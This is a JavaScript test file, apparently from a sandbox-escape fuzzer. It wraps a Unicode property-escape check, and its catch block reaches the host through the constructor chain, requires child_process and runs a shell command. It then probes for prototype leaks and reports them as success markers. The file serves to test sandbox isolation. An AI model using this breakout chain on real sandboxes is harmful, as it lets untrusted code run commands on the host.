try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                12272,
                12273
            ],
            [
                12276,
                12283
            ]
        ]
    });
    testPropertyEscapes(/^\p{IDS_Binary_Operator}+$/u, matchSymbols, '\\p{IDS_Binary_Operator}');
    testPropertyEscapes(/^\p{IDSB}+$/u, matchSymbols, '\\p{IDSB}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                12271
            ],
            [
                12274,
                12275
            ],
            [
                12284,
                56319
            ],
            [
                57344,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{IDS_Binary_Operator}+$/u, nonMatchSymbols, '\\P{IDS_Binary_Operator}');
    testPropertyEscapes(/^\P{IDSB}+$/u, nonMatchSymbols, '\\P{IDSB}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}